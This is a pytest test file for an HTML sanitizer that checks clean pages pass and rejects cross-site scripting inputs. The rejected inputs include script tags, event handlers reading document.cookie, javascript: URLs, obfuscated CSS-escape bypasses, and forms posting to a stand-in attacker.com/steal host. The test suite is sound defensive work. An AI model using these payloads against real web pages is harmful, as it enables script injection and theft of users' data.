import pytest
from backend.app.services.html_sanitizer import (
    validate_and_sanitize_html,
    SecurityValidationResult,
    DEFAULT_MAX_HTML_SIZE_BYTES,
)


def test_safe_html_document_accepted():
    safe_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Growth Strategy Playbook</title>
    <style>
        :root { --accent: #BE5103; }
        body { font-family: sans-serif; margin: 0; padding: 2rem; background: #FFFDF8; color: #1F1F1F; }
        .card { border: 1px solid #ddd; border-radius: 8px; padding: 1.5rem; background: #fff; }
        .metric { font-size: 2rem; font-weight: bold; color: var(--accent); }
    </style>
</head>
<body>
    <header>
        <h1>Elena Verna B2B Growth Strategy</h1>
        <p>A self-serve product loop framework.</p>
    </header>
    <main>
        <section class="card">
            <h2>Retention Loops</h2>
            <p>Sustainable growth is driven by retention, not acquisition.</p>
            <div class="metric">85%</div>
            <p><small>*Illustrative sample metric</small></p>
        </section>
        <section>
            <table>
                <thead>
                    <tr><th>Motion</th><th>Metric</th></tr>
                </thead>
                <tbody>
                    <tr><td>Product-Led</td><td>Expansion</td></tr>
                </tbody>
            </table>
        </section>
    </main>
</body>
</html>"""
    res = validate_and_sanitize_html(safe_html)
    assert res.is_valid is True
    assert len(res.errors) == 0
    assert res.sanitized_content == safe_html
    assert res.stats["tag_count"] > 10
    assert res.stats["style_count"] == 1


def test_script_tag_rejected():
    malicious_html = """<div>
        <h1>Dashboard</h1>
        <script>alert('XSS execution');</script>
        <p>Text</p>
    </div>"""
    res = validate_and_sanitize_html(malicious_html)
    assert res.is_valid is False
    assert any("Forbidden tag <script>" in err for err in res.errors)


def test_inline_event_handlers_rejected():
    test_cases = [
        '<button onclick="alert(1)">Click</button>',
        '<img src="sample.png" onerror="alert(document.cookie)">',
        '<div onmouseover="steal()">Hover</div>',
        '<body onload="init()">Content</body>',
        '<svg onload="alert(1)"></svg>',
    ]
    for case in test_cases:
        res = validate_and_sanitize_html(case)
        assert res.is_valid is False, f"Expected failure for: {case}"
        assert any("Inline event handler" in err for err in res.errors)


def test_unsafe_url_schemes_rejected():
    test_cases = [
        '<a href="javascript:alert(1)">Click me</a>',
        '<a href="JAVASCRIPT:void(0)">Link</a>',
        '<a href="vbscript:msgbox(1)">VisualBasic</a>',
        '<a href="data:text/html,<script>alert(1)</script>">Data URI</a>',
        '<a href="data:application/javascript,alert(1)">JS Data URI</a>',
        '<img src="javascript:alert(1)">',
    ]
    for case in test_cases:
        res = validate_and_sanitize_html(case)
        assert res.is_valid is False, f"Expected failure for: {case}"
        assert any("Dangerous URL scheme" in err for err in res.errors)


def test_safe_urls_accepted():
    safe_urls_html = """<div>
        <a href="https://youtube.com/watch?v=123">Watch Podcast</a>
        <a href="http://lennyrachitsky.com/podcast">Lenny Podcast</a>
        <a href="mailto:growth@oogway.ai">Contact</a>
        <a href="#section-2">Jump to Section</a>
        <a href="/dashboard/metrics">Internal path</a>
    </div>"""
    res = validate_and_sanitize_html(safe_urls_html)
    assert res.is_valid is True
    assert len(res.errors) == 0


def test_external_stylesheet_rejected():
    external_css_html = """<head>
        <link rel="stylesheet" href="https://evil.com/styles.css">
    </head><body>Content</body>"""
    res = validate_and_sanitize_html(external_css_html)
    assert res.is_valid is False
    assert any("external stylesheet" in err for err in res.errors)


def test_css_import_and_dangerous_properties_rejected():
    cases = [
        "<style>@import url('https://evil.com/style.css'); body { color: red; }</style>",
        "<style>body { background: url('https://tracker.com/pixel.png'); }</style>",
        "<style>body { -moz-binding: url('http://evil.com/xss.xml#test'); }</style>",
        "<style>body { width: expression(alert(1)); }</style>",
        '<div style="@import url(evil.css); color: blue;">Styled</div>',
        '<div style="background: url(\'https://tracker.com/p\')">Tracker</div>',
        '<div style="width: expression(alert(1))">Expression</div>',
    ]
    for case in cases:
        res = validate_and_sanitize_html(case)
        assert res.is_valid is False, f"Expected failure for: {case}"
        assert any("Dangerous CSS" in err for err in res.errors)


def test_framing_and_embedded_vectors_rejected():
    cases = [
        '<iframe src="https://example.com"></iframe>',
        '<object data="exploit.swf"></object>',
        '<embed src="plugin.pdf">',
        '<applet code="Java.class"></applet>',
        '<base href="https://attacker.com/">',
        '<form action="https://attacker.com/steal"><input name="pass"></form>',
        '<meta http-equiv="refresh" content="0;url=https://attacker.com">',
    ]
    for case in cases:
        res = validate_and_sanitize_html(case)
        assert res.is_valid is False, f"Expected failure for: {case}"


def test_oversized_payload_rejected():
    large_html = "<p>" + ("A" * (DEFAULT_MAX_HTML_SIZE_BYTES + 10)) + "</p>"
    res = validate_and_sanitize_html(large_html)
    assert res.is_valid is False
    assert any("exceeds maximum allowable limit" in err for err in res.errors)


def test_empty_content_rejected():
    assert validate_and_sanitize_html("").is_valid is False
    assert validate_and_sanitize_html(None).is_valid is False
    assert validate_and_sanitize_html(123).is_valid is False


def test_css_escape_and_comment_bypasses_rejected():
    cases = [
        # Hex escaped @import
        "<style>@\\69 mport 'https://evil.com/style.css'; body { color: red; }</style>",
        # Hex escaped url()
        "<style>body { background: \\75\\72\\6c('https://evil.com/bg.png'); }</style>",
        # Inline style with hex escaped url
        '<div style="background: \\000075\\000072\\00006c(\'https://tracker.com\')">Tracked</div>',
        # CSS comment inside @import
        "<style>@/*comment*/import 'https://evil.com/s.css';</style>",
    ]
    for case in cases:
        res = validate_and_sanitize_html(case)
        assert res.is_valid is False, f"Expected failure for: {case}"
        assert any("Dangerous CSS" in err for err in res.errors)


def test_obfuscated_javascript_url_schemes_rejected():
    cases = [
        '<a href="jav&#x0A;ascript:alert(1)">Link with newline</a>',
        '<a href="jav&#x09;ascript:alert(1)">Link with tab</a>',
        '<a href=" javascript:alert(1)">Link with leading whitespace</a>',
        '<img src=" java&#x00;script:alert(1)">',
        '<a href="JAVASCRIPT:alert(1)">Upper scheme</a>',
    ]
    for case in cases:
        res = validate_and_sanitize_html(case)
        assert res.is_valid is False, f"Expected failure for: {case}"


def test_foreignobject_math_and_svg_vectors_rejected():
    cases = [
        '<svg><foreignObject><div>Content</div></foreignObject></svg>',
        '<math><mtext>Test</mtext></math>',
        '<svg><animate attributeName="href" values="javascript:alert(1)"></animate></svg>',
    ]
    for case in cases:
        res = validate_and_sanitize_html(case)
        assert res.is_valid is False, f"Expected failure for: {case}"


def test_srcset_and_formaction_attributes_rejected():
    cases = [
        '<img src="valid.png" srcset="javascript:alert(1) 1x">',
        '<button formaction="https://attacker.com/steal">Submit</button>',
    ]
    for case in cases:
        res = validate_and_sanitize_html(case)
        assert res.is_valid is False, f"Expected failure for: {case}"


def test_unclosed_style_tag_rejected():
    case = "<style>body { width: expression(alert(1)); }"  # No closing </style>
    res = validate_and_sanitize_html(case)
    assert res.is_valid is False
    assert any("Dangerous CSS" in err for err in res.errors)

